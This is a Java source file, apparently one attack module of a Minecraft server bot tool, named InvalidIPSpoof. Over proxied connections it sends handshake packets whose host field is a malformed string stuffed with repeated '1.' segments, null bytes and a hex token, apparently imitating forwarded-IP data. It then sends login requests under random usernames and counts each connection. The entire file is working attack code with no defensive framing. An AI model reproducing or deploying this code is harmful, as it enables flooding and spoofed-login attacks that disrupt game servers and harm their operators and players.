package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Random;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;
import xyz.mcbot.minecraftutils.Handshake;
import xyz.mcbot.minecraftutils.LoginRequest;

public class InvalidIPSpoof
  implements Method
{
  private SecureRandom r;
  private String lol;
  private int a;
  
  public InvalidIPSpoof()
  {
    r = new SecureRandom();
    lol = "";
    a = 14;
    for (int i = 1; i < a + 1; i++)
      lol = (String.valueOf(lol) + String.valueOf((char)(r.nextInt(125) + 1)));
  }
  
  private String randomString(int len) {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(targetStringLength);
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + 
        (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    }
    return buffer.toString();
  }
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException { while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(new Handshake(Main.protcolID, "1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1......\000.\000f84c6a790a4e45e0879bcd49ebd4c4e2", Main.port, 2).getWrappedPacket()));
    channel.writeAndFlush(Unpooled.buffer().writeBytes(new LoginRequest(randomString(14)).getWrappedPacket()));
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
  }
}
